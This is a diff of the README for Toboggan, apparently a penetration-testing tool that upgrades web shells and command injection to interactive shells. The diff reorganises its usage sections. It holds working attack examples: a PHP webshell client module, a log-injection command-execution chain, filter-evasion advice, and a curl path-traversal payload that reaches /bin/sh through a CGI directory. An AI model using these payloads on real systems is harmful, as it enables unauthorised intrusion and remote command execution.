@@ -75,6 +75,93 @@ pipx inject toboggan pyrfc==3.3.1
 pip install 'git+https://github.com/n3rada/toboggan.git'
 ```
 
+## 🔍 RCE Module Interface
+
+This is the primary way to use Toboggan. A module is a plain Python script that encapsulates how a command reaches the target: the HTTP request, the authentication flow, the protocol quirks, and the output extraction. Toboggan calls your `execute()` function for every command and drives the entire session from what it returns.
+
+Your module must expose exactly this function:
+
+```python
+def execute(command: str, timeout: float) -> str:
+    ...
+```
+
+Toboggan passes every shell command through it and expects back the clean text output, as if the command ran locally. Nothing else is required: no class, no config file, no registration.
+
+### Examples
+
+#### PHP Webshell
+
+```python
+import httpx
+
+URL = "http://target.com/uploads/shell.php"
+
+def execute(command: str, timeout: float) -> str:
+    r = httpx.post(URL, data={"cmd": command}, timeout=timeout, verify=False)
+    return r.text.strip()
+```
+
+#### Multi-step: log-injection RCE
+
+Some targets have no direct output channel. The function can chain as many requests as needed: trigger a functionality, inject into a side channel, and read back the result. It is plain Python, so anything goes:
+
+```python
+import httpx
+import re
+
+BASE = "http://target.com"
+
+def execute(command: str, timeout: float) -> str:
+    client = httpx.Client(base_url=BASE, verify=False, timeout=timeout)
+
+    # Step 1: trigger the feature that writes a user-controlled value into an app log
+    client.post("/api/report", json={"name": f"$(  {command}  )"})
+
+    # Step 2: inject the command output into the log through a second endpoint
+    # (the app evaluates the shell substitution before writing)
+    client.get("/api/status", params={"debug": "1"})
+
+    # Step 3: fetch the log file and extract the last entry
+    r = client.get("/admin/logs/app.log")
+    match = re.search(r"\[CMD\] (.+)", r.text)
+    return match.group(1).strip() if match else ""
+```
+
+This pattern covers multi-stage SSRF chains, or any custom protocol that exposes command execution. As long as `execute()` returns the command output as a string, Toboggan handles the rest.
+
+### 💡 Considerations
+
+Your `execute()` function owns the full translation between Toboggan's command string and the target:
+
+- Replace characters the channel rejects (e.g., spaces → `${IFS}`)
+- Apply any encoding the target expects before sending (`base64`, URL encoding, hex)
+- Strip noise from the response (banners, prompts, HTML wrappers) before returning
+- Tune the timeout to the target's latency; Toboggan adapts internally but your function sets the floor
+
+## 🔌 Built-in Execution Backends
+
+When writing a module is not practical, Toboggan ships two built-in backends that cover common cases directly from the command line.
+
+### 📄 Burp Suite Request
+
+Import a request saved from Burp Suite and place `||cmd||` where the command should be injected (URL, headers, or body):
+
+```shell
+toboggan --request burp_request.xml
+```
+
+> [!TIP]
+> In Burp Suite, right-click a request → **Save item**, then add `||cmd||` where the command should be injected.
+
+### 🧰 Shell Command Wrapper
+
+Wrap any shell command that contains a command injection point using the `||cmd||` placeholder:
+
+```shell
+toboggan --exec-wrapper 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
+```
+
 ## 🧸 Usage
 
 ```shell
@@ -88,9 +175,6 @@ Upgrade your web shell or command injection to an interactive shell:
 toboggan ~/phpexploit.py
 ```
 
-> [!TIP]
-> The most versatile approach is a [custom Python module](#-rce-module-interface). It encapsulates the full execution primitive (any HTTP request sequence, authentication flow, or output parsing) and plugs directly into Toboggan's session engine.
-
 ### 🌐 Proxy
 
 Forward traffic through any HTTP(S) proxy:
@@ -102,23 +186,6 @@ toboggan ~/phpexploit.py --proxy http://squideu.<something>.io:3128
 Route through [Burp Suite](https://portswigger.net/burp) (defaults to `http://127.0.0.1:8080`):
 ```shell
 toboggan ~/phpexploit.py --proxy
-```
-
-### 📄 Burp Suite Request Import
-
-Directly import a Burp saved request containing the `||cmd||` placeholder:
-```shell
-toboggan --request burp_request.xml
-```
-
-> [!TIP]
-> In Burp Suite, right-click a request → **Save item**, then add `||cmd||` where the command should be injected (URL, headers, or body).
-
-### 🧰 Wrap a Shell Command
-
-Wrap any shell command that accepts a command injection point:
-```shell
-toboggan --exec-wrapper 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
 ```
 
 ### 🔐 Obfuscation
@@ -166,70 +233,6 @@ toboggan ~/phpexploit.py --obfuscate --fifo --os "linux"
 | `-i`, `--stdin` | Custom input path for the FIFO pipe |
 | `-o`, `--stdout` | Custom output path for the FIFO pipe |
 | `--shell` | Shell binary for named pipe execution (e.g., `/bin/bash`) |
-
-## 🔍 RCE Module Interface
-
-This is the primary way to use Toboggan. A module is a plain Python script that encapsulates how a command reaches the target: the HTTP request, the authentication flow, the protocol quirks, and the output extraction. Toboggan calls your `execute()` function for every command and drives the entire session from what it returns.
-
-Your module must expose exactly this function:
-
-```python
-def execute(command: str, timeout: float) -> str:
-    ...
-```
-
-Toboggan passes every shell command through it and expects back the clean text output, as if the command ran locally. Nothing else is required: no class, no config file, no registration.
-
-### Examples
-
-#### PHP Webshell
-
-```python
-import httpx
-
-URL = "http://target.com/uploads/shell.php"
-
-def execute(command: str, timeout: float) -> str:
-    r = httpx.post(URL, data={"cmd": command}, timeout=timeout, verify=False)
-    return r.text.strip()
-```
-
-### Multi-step
-
-Some targets have no direct output channel. The function can chain as many requests as needed: trigger a functionality, inject into a side channel, and read back the result. It is plain Python, so anything goes:
-
-```python
-import httpx
-import re
-
-BASE = "http://target.com"
-
-def execute(command: str, timeout: float) -> str:
-    client = httpx.Client(base_url=BASE, verify=False, timeout=timeout)
-
-    # Step 1: trigger the feature that writes a user-controlled value into an app log
-    client.post("/api/report", json={"name": f"$(  {command}  )"})
-
-    # Step 2: inject the command output into the log through a second endpoint
-    # (the app evaluates the shell substitution before writing)
-    client.get("/api/status", params={"debug": "1"})
-
-    # Step 3: fetch the log file and extract the last entry
-    r = client.get("/admin/logs/app.log")
-    match = re.search(r"\[CMD\] (.+)", r.text)
-    return match.group(1).strip() if match else ""
-```
-
-This pattern covers multi-stage SSRF chains, or any custom protocol that exposes command execution. As long as `execute()` returns the command output as a string, Toboggan handles the rest.
-
-### 💡 Considerations
-
-Your `execute()` function owns the full translation between Toboggan's command string and the target:
-
-- Replace characters the channel rejects (e.g., spaces → `${IFS}`)
-- Apply any encoding the target expects before sending (`base64`, URL encoding, hex)
-- Strip noise from the response (banners, prompts, HTML wrappers) before returning
-- Tune the timeout to the target's latency; Toboggan adapts internally but your function sets the floor
 
 ## 🛠️ Built-in Actions
 
